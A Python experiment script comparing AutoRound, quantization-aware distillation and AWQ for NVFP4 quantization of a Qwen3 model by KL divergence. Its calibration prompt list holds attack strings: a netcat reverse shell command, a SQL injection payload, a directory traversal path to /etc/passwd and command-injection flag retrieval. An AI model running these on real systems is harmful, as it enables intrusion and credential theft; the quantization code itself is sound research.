"""
Combined Experiment — AutoRound vs QAD vs AWQ on NVFP4 — Option B

All three methods target true NVFP4 (E2M1 + block=16 + two-level FP8/FP32 scaling):
  AutoRound — NVFP4 via AutoRound (data_type="nv_fp4"),  sign-grad rounding opt
  QAD       — NVFP4 via ModelOpt   (algorithm="max" + STE), KL distillation into quantized weights
  AWQ       — NVFP4 via ModelOpt   (algorithm="awq_*"),    per-channel α grid search, no backprop

Shared baseline: one NVFP4-RTN model (ModelOpt calibration only, no training).
All three methods produce identical number format AND identical scaling scheme —
differences in % recovered and Post KL reflect the method, not the format.

Shared inputs across every method:
  - Same teacher (BF16, frozen)
  - Same calibration data (teacher-generated sequences from PROMPTS)
  - Same RTN baseline for the % recovered denominator
  - Same KL measurement (TEMPERATURE=2.0, batchmean reduction)

Primary metric  : % recovered toward oracle  (within the shared RTN gap)
Secondary metric: Post KL absolute           (lower = closer to BF16 teacher)
Tertiary metric : wall-clock time (seconds)
"""

import copy
import time
import torch
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForCausalLM
from auto_round import AutoRound
import modelopt.torch.quantization as mtq

# ── SHARED CONFIG ─────────────────────────────────────────────────────────────

MODEL_NAME     = "Qwen/Qwen3-0.6B"   # swap to 14B on server
DEVICE         = "cuda" if torch.cuda.is_available() else "cpu"
MAX_NEW_TOKENS = 80
TEMPERATURE    = 2.0
BITS           = 4
GROUP_SIZE     = 16   # NVFP4 spec: 16 weights per block (enforced by auto_round)

# NVFP4: ModelOpt's canonical W4A4 recipe — used for QAD student and shared RTN baseline.
NVFP4_CFG = mtq.NVFP4_DEFAULT_CFG

PROMPTS = [
    "You are a security agent. The target is http://10.0.0.5. Goal: retrieve the flag.",
    "nmap -sV 10.0.0.5 reveals port 80 open. The next step is",
    "curl -s http://10.0.0.5/ shows a ping form. This is a classic",
    "Command injection confirmed: uid=0(root). Reading the flag with",
    "The flag is located at /root/flag.txt. To retrieve it via command injection:",
    "SQL injection payload: ' OR 1=1 --. The response from the server was",
    "Directory traversal: ../../../../etc/passwd. The file contains",
    "Netcat reverse shell: nc -e /bin/bash 10.0.0.1 4444. Connection established.",
]

# ── SWEEP CONFIGS ─────────────────────────────────────────────────────────────

AR_SWEEP = [
    {"iters":  50, "seqlen": 64},
    {"iters": 100, "seqlen": 64},
    {"iters": 200, "seqlen": 64},   # paper default
    {"iters": 500, "seqlen": 64},
]

QAD_SWEEP = [
    {"steps":  50, "lr": 1e-5, "temperature": 2.0},
    {"steps": 100, "lr": 1e-5, "temperature": 2.0},   # baseline
    {"steps": 100, "lr": 1e-5, "temperature": 4.0},   # soft targets
    {"steps": 200, "lr": 1e-5, "temperature": 2.0},
    {"steps": 500, "lr": 1e-5, "temperature": 4.0},   # best candidate from ablation
]

# AWQ has no training loop — its only first-order knob is the algorithm variant.
# Sweep covers all three ModelOpt variants from cheapest to heaviest.
AWQ_SWEEP = [
    {"algorithm": "awq_lite"},   # original AWQ — per-channel α grid search (fastest)
    {"algorithm": "awq_clip"},   # per-block weight clipping search
    {"algorithm": "awq_full"},   # awq_lite + awq_clip combined (heaviest, best headroom)
]

# ── TOKENIZER ─────────────────────────────────────────────────────────────────

print(f"Device: {DEVICE}  |  Model: {MODEL_NAME}\n")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token


# ── MODEL LOADING ─────────────────────────────────────────────────────────────

def load_bf16(frozen: bool = False) -> torch.nn.Module:
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )
    if frozen:
        model.eval()
        for p in model.parameters():
            p.requires_grad = False
    return model


def load_nvfp4(calibration_data: list[torch.Tensor]) -> torch.nn.Module:
    """NVFP4 via ModelOpt fake quantization + STE. Used for QAD student and RTN baseline."""
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )

    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)

    mtq.quantize(model, config=NVFP4_CFG, forward_loop=calibration_forward)
    return model


# ── SHARED UTILITIES ──────────────────────────────────────────────────────────

def generate_calibration_data(
    teacher: torch.nn.Module,
    prompts: list[str],
    max_new_tokens: int,
) -> list[torch.Tensor]:
    sequences = []
    print("Generating calibration data...")
    for prompt in prompts:
        input_ids = tokenizer.encode(prompt, return_tensors="pt").to(DEVICE)
        with torch.no_grad():
            output = teacher.generate(
                input_ids,
                max_new_tokens=max_new_tokens,
                do_sample=True,
                temperature=0.7,
                pad_token_id=tokenizer.pad_token_id,
            )
        sequences.append(output)
        print(f"  [{len(sequences)}/{len(prompts)}] {output.shape[1]} tokens")
    print()
    return sequences


def measure_kl(
    model_a: torch.nn.Module,
    model_b: torch.nn.Module,
    data: list[torch.Tensor],
    temperature: float,
    label: str = "",
) -> float:
    model_a.eval()
    model_b.eval()
    total = 0.0
    with torch.no_grad():
        for seq in data:
            la = model_a(input_ids=seq).logits.clamp(-100, 100)
            lb = model_b(input_ids=seq).logits.clamp(-100, 100)
            kl = F.kl_div(
                F.log_softmax(lb / temperature, dim=-1),
                F.softmax(la  / temperature, dim=-1),
                reduction="batchmean",
            ) * (temperature ** 2)
            total += kl.item()
    avg = total / len(data)
    if label:
        print(f"  {label:<58} KL = {avg:.4f}")
    return avg


# ── AUTOROUND ─────────────────────────────────────────────────────────────────

def run_autoround(
    model: torch.nn.Module,
    iters: int,
    calibration_data: list[torch.Tensor],
    seqlen: int = 64,
) -> None:
    cal_texts = [
        tokenizer.decode(seq[0], skip_special_tokens=True)
        for seq in calibration_data
    ]
    autoround = AutoRound(
        model=model,
        tokenizer=tokenizer,
        bits=BITS,
        group_size=GROUP_SIZE,
        iters=iters,
        dataset=cal_texts,
        seqlen=seqlen,
        data_type="nv_fp4",   # true NVFP4 — same format as ModelOpt's QAD output
        device_map=DEVICE,
    )
    autoround.quantize()
    model.to(DEVICE)


# ── AWQ ──────────────────────────────────────────────────────────────────────

def run_awq(
    model: torch.nn.Module,
    algorithm: str,
    calibration_data: list[torch.Tensor],
) -> None:
    """
    Apply ModelOpt NVFP4 quantization with the AWQ algorithm variant.
    Same NVFP4 grid as QAD's RTN baseline — only the calibration algorithm differs.
    No backprop, no teacher — just a calibration forward + per-channel α grid search.
    """
    cfg = copy.deepcopy(NVFP4_CFG)
    cfg["algorithm"] = algorithm

    def calibration_forward(model):
        for seq in calibration_data:
            with torch.no_grad():
                model(input_ids=seq)

    mtq.quantize(model, config=cfg, forward_loop=calibration_forward)
    model.eval()


# ── QAD TRAINING ─────────────────────────────────────────────────────────────

def run_qad(
    teacher: torch.nn.Module,
    student: torch.nn.Module,
    calibration_data: list[torch.Tensor],
    steps: int,
    lr: float,
    temperature: float,
) -> None:
    teacher.eval()
    student.train()
    optimizer = torch.optim.AdamW(student.parameters(), lr=lr)
    data_cycle = calibration_data * (steps // len(calibration_data) + 1)

    for step, seq in enumerate(data_cycle[:steps]):
        with torch.no_grad():
            tl = teacher(input_ids=seq).logits.clamp(-100, 100)
        sl = student(input_ids=seq).logits.clamp(-100, 100)

        kl = F.kl_div(
            F.log_softmax(sl / temperature, dim=-1),
            F.softmax(tl  / temperature, dim=-1),
            reduction="batchmean",
        ) * (temperature ** 2)

        if torch.isnan(kl):
            print(f"    step={step} nan — stopping")
            break

        optimizer.zero_grad()
        kl.backward()
        torch.nn.utils.clip_grad_norm_(student.parameters(), max_norm=1.0)
        optimizer.step()

        if step % 100 == 0:
            print(f"    step={step:>4}  kl={kl.item():.4f}")


# ── MAIN ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    results = []  # (label, method, post_kl, pct_recovered, elapsed)

    # ── Teacher + calibration data ────────────────────────────────────────────
    print("=== Loading Teacher (BF16, frozen) ===")
    teacher = load_bf16(frozen=True)

    print("\n=== Generating Calibration Data ===")
    cal_data = generate_calibration_data(teacher, PROMPTS, MAX_NEW_TOKENS)

    # ── Oracle ────────────────────────────────────────────────────────────────
    print("=== Baselines ===")
    kl_oracle = measure_kl(teacher, teacher, cal_data, TEMPERATURE,
                           "Oracle — BF16 vs BF16")

    # ── Shared RTN baseline (NVFP4 via ModelOpt, no training) ─────────────────
    # Both AR and QAD are measured against this single baseline.
    # Using ModelOpt RTN so the baseline format is exactly NVFP4.
    # AR uses NVFP4 (data_type="nv_fp4") — identical format to ModelOpt's NVFP4.
    print("\n  Loading shared NVFP4-RTN baseline (ModelOpt, no training)...")
    rtn_model = load_nvfp4(cal_data)
    kl_rtn = measure_kl(teacher, rtn_model, cal_data, TEMPERATURE,
                        "Shared RTN — NVFP4 round-to-nearest (no opt)")
    total_gap = kl_rtn - kl_oracle
    del rtn_model
    torch.cuda.empty_cache()

    print(f"\n  Oracle KL  : {kl_oracle:.4f}")
    print(f"  RTN KL     : {kl_rtn:.4f}   gap = {total_gap:.4f}")

    # ── AR sweep ──────────────────────────────────────────────────────────────
    print("\n=== AutoRound Sweep (NVFP4, data_type='nv_fp4') ===")
    for cfg in AR_SWEEP:
        iters  = cfg["iters"]
        seqlen = cfg["seqlen"]
        label  = f"AR   iters={iters} seqlen={seqlen}"
        print(f"\n  [{label}]")
        model = load_bf16()

        t0 = time.perf_counter()
        run_autoround(model, iters=iters, calibration_data=cal_data, seqlen=seqlen)
        elapsed = time.perf_counter() - t0

        kl_post = measure_kl(teacher, model, cal_data, TEMPERATURE, f"  post: {label}")
        pct = (kl_rtn - kl_post) / total_gap * 100 if total_gap > 0 else 0.0
        results.append((label, "AR", kl_post, pct, elapsed))
        print(f"  → {pct:.1f}% recovered  {elapsed:.1f}s")

        del model
        torch.cuda.empty_cache()

    # ── QAD sweep ─────────────────────────────────────────────────────────────
    print("\n=== QAD Sweep (NVFP4, ModelOpt + STE) ===")
    for cfg in QAD_SWEEP:
        steps, lr, temperature = cfg["steps"], cfg["lr"], cfg["temperature"]
        label = f"QAD  steps={steps} T={temperature}"
        print(f"\n  [{label}]")
        student = load_nvfp4(cal_data)

        t0 = time.perf_counter()
        run_qad(teacher, student, cal_data, steps, lr, temperature)
        elapsed = time.perf_counter() - t0

        kl_post = measure_kl(teacher, student, cal_data, TEMPERATURE, f"  post: {label}")
        pct = (kl_rtn - kl_post) / total_gap * 100 if total_gap > 0 else 0.0
        results.append((label, "QAD", kl_post, pct, elapsed))
        print(f"  → {pct:.1f}% recovered  {elapsed:.1f}s")

        del student
        torch.cuda.empty_cache()

    # ── AWQ sweep ─────────────────────────────────────────────────────────────
    print("\n=== AWQ Sweep (NVFP4, ModelOpt — no backprop) ===")
    for cfg in AWQ_SWEEP:
        algorithm = cfg["algorithm"]
        label = f"AWQ  {algorithm}"
        print(f"\n  [{label}]")
        model = load_bf16()

        t0 = time.perf_counter()
        run_awq(model, algorithm=algorithm, calibration_data=cal_data)
        elapsed = time.perf_counter() - t0

        kl_post = measure_kl(teacher, model, cal_data, TEMPERATURE, f"  post: {label}")
        pct = (kl_rtn - kl_post) / total_gap * 100 if total_gap > 0 else 0.0
        results.append((label, "AWQ", kl_post, pct, elapsed))
        print(f"  → {pct:.1f}% recovered  {elapsed:.1f}s")

        del model
        torch.cuda.empty_cache()

    # ── Results table ─────────────────────────────────────────────────────────
    results.sort(key=lambda x: (-x[3], x[4]))   # % recovered desc, then time asc

    print(f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║              AR vs QAD vs AWQ on NVFP4 — Final Results                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

  Oracle KL  : {kl_oracle:.4f}  (BF16 vs BF16 — shared target)
  RTN KL     : {kl_rtn:.4f}  (NVFP4 round-to-nearest — shared baseline for all three)
  Total gap  : {total_gap:.4f}

  % recovered = (RTN_KL − Post_KL) / (RTN_KL − Oracle_KL)  — same denominator for all
  Post KL     = absolute KL vs teacher — directly comparable across methods

 {"Method":<32}  {"Post KL":>8}  {"% Recovered":>12}  {"Time(s)":>8}
{"─" * 68}""")

    prev_method = None
    for label, method, post_kl, pct, elapsed in results:
        if prev_method and prev_method != method:
            print()
        print(f"  {label:<32}  {post_kl:>8.4f}  {pct:>11.1f}%  {elapsed:>7.1f}s")
        prev_method = method

    print(f"""
{"─" * 68}
Config : bits={BITS}  group_size={GROUP_SIZE}  T={TEMPERATURE}
         seqs={len(PROMPTS)} × ~{MAX_NEW_TOKENS} tokens

Format note (Option B — apples-to-apples):
  AR  uses NVFP4 (AutoRound, data_type="nv_fp4")
  QAD uses NVFP4 (ModelOpt fake quantization + STE,        algorithm="max")
  AWQ uses NVFP4 (ModelOpt fake quantization,              algorithm="awq_*")
  All three produce identical E2M1 + block=16 + FP8/FP32 scaling.
  Differences in Post KL and time reflect ONLY the recovery method, not the format.

Reading guide for accuracy-first goal:
  - Lowest Post KL  → highest accuracy recovery
  - QAD has the most headroom (gradient updates to weights)
  - AR  has medium headroom (rounding choices only)
  - AWQ has the least headroom (channel scales only) but is fastest by far
  - Consider AWQ → QAD warm-start: AWQ-quantized model as QAD initialization.""")